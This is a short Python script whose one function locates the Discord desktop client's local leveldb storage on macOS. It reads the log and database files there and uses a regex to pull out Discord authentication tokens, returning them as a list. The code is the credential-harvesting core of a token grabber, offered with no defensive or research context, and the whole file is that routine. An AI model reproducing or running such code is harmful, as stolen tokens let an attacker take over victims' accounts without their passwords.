import os
import re

def find_discord_tokens():
    paths = [
        os.path.expanduser("~/Library/Application Support/discord/Local Storage/leveldb")
    ]

    tokens = []
    pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"

    for path in paths:
        if not os.path.exists(path):
            continue

        for file in os.listdir(path):
            if file.endswith(".log") or file.endswith(".ldb"):
                try:
                    with open(os.path.join(path, file), "r", errors="ignore") as f:
                        tokens += re.findall(pattern, f.read())
                except:
                    pass

    return list(set(tokens))